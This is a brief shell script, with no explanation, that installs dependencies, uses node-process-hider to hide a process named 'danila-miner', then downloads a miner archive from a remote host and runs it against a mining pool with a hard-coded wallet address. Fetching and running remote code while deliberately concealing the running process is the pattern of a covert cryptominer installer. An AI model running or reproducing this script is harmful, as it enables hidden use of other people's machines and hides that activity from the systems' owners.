#!/bin/sh
sudo apt update -y
sudo apt install screen -y
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add danila-miner
wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-bionic-hive.tar.gz && tar -xvf danila-miner-2.3.1-bionic-hive.tar.gz && cd danila-miner-2.3.1-bionic && ./danila-miner run https://server1.whalestonpool.com EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi
